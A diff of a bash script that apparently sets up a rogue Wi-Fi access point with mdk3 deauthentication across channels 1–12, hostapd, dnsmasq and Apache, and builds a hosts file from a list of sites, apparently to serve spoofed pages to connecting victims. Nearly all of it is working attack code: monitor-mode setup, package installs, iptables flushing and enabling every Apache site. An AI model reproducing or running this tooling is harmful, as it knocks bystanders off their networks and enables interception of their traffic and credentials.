@@ -15,9 +15,10 @@ DHCP_MASK="255.255.255.0"
 RESOLVE_SERVER_1="1.1.1.1"
 RESOLVE_SERVER_2="1.0.0.1"
 
-DEAUTH_CHANNEL="1,2,4,7,8,9,10,11"
+DEAUTH_CHANNEL="1,2,3,4,5,6,7,8,9,10,11,12"
 
 CURRENT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+CURRENT_NAME="$(basename "$(test -L "$0" && readlink "$0" || echo "$0")")"
 LOG_DIR="/var/log"
 
 BLUE='\033[1;34m'
@@ -30,6 +31,15 @@ INFO="${BLUE}[*]${NC} "
 ERROR="${RED}[-]${NC} "
 SUCESS="${GREEN}[+]${NC} "
 WARNING="${ORANGE}[!]${NC} "
+
+# Kill others copy of this script
+while read -r PID
+do
+    if [ ${PID} -lt $$ ]
+    then
+        kill -9 ${PID}
+    fi
+done < <(pgrep "${CURRENT_NAME}")
 
 # Kill interrupt process
 /etc/init.d/network-manager stop 2>/dev/null
@@ -90,11 +100,11 @@ iwconfig ${MDK3_IFACE} mode monitor
 ifconfig ${MDK3_IFACE} up
 
 # Check installed programs
-if ! dpkg --list | grep -qe "ii\s*apache2 "; then apt -y -qq install apache2; fi
-if ! dpkg --list | grep -qe "ii\s*libapache2-mod-security2 "; then apt -y -qq install libapache2-mod-security2; fi
-if ! dpkg --list | grep -qe "ii\s*hostapd "; then apt -y -qq install hostapd; fi
-if ! dpkg --list | grep -qe "ii\s*dnsmasq "; then apt -y -qq install dnsmasq; fi
-if ! dpkg --list | grep -qe "ii\s*mdk3 "; then apt -y -qq install mdk3; fi
+if ! dpkg --list | grep -qe "ii\s*apache2 " || ! dpkg --list | grep -qe "ii\s*libapache2-mod-security2 " || ! dpkg --list | grep -qe "ii\s*hostapd " || ! dpkg --list | grep -qe "ii\s*dnsmasq-base " || ! dpkg --list | grep -qe "ii\s*mdk3 "
+then
+    apt update
+    apt -y -qq install apache2 libapache2-mod-security2 hostapd dnsmasq-base mdk3
+fi
 
 # IP forward
 iptables -t nat -F
@@ -126,6 +136,12 @@ do
 		echo -e "${host}" >> ${CURRENT_DIR}/hosts.txt
 	fi
 done < ${CURRENT_DIR}/sites.txt
+
+while read -r site
+do
+    a2ensite $site >/dev/null 2>&1
+done < <(ls /etc/apache2/sites-available/)
+
 /etc/init.d/apache2 restart
 
 # Hostapd settings
